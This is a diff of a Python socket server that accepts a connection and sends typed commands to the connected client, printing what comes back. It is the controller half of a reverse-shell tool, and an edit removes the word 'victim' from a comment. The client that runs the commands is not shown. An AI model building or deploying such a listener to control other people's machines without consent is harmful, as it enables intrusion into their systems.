@@ -1,4 +1,4 @@
-# Server
+# Server file
 
 import socket  # for socket
 import sys  # implement command lines
@@ -28,24 +28,22 @@ def bind_socket():
         print("Binding Port " + str(port))
 
         s.bind((host,port))
-        s.listen(5)  # continously listen for connection. list for 5 connections
+        s.listen(5)
 
     except socket.error as msg:
         print("Socket binding error " + str(msg) + "\n" + "Retrying...")
-        bind_socket()  # recall function to retry binding port and host with socket
+        bind_socket()
 
 
 # Eastablish connection with a client (socket must be listening)
 def socket_accept():
-    conn, address = s.accept()  # accept the connection
-    # connection stored in conn
-    # ip address stored in address
+    conn, address = s.accept()
     print("Connection has been established " + " IP " + address[0] + " | Port " + str(address[1]))
     send_commands(conn)
     conn.close()
 
 
-# Send commands to client/victim or a friend
+# Send commands to client or a friend
 def send_commands(conn):
     while True:
         cmd = input()
@@ -61,7 +59,7 @@ def send_commands(conn):
             print(client_response, end="") # end="" returns cursor to next line
 
 
-# Calls above function
+# Calls above functions
 def main():
     create_socket()
     bind_socket()
